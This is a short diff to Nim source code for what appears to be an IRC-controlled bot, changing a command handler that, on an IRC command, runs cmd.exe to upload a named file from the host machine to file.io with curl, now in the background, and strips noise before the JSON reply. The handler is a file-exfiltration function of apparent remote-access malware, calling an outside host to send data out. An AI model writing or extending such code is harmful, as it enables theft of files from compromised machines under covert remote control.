@@ -103,7 +103,16 @@ proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 
     if fileExists(filename):
         try:
-            var (output, _ ) = execCmdEx("cmd.exe /C curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+            var
+                (output, _ ) = execCmdEx("cmd.exe /C start /B curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+                trash:string
+                i:int = 0
+
+            while output[i] != '{':
+                trash &= output[i]
+                inc(i)
+
+            output = output.replace(trash, "")
 
             if output.contains("success\":true"):
                 try:
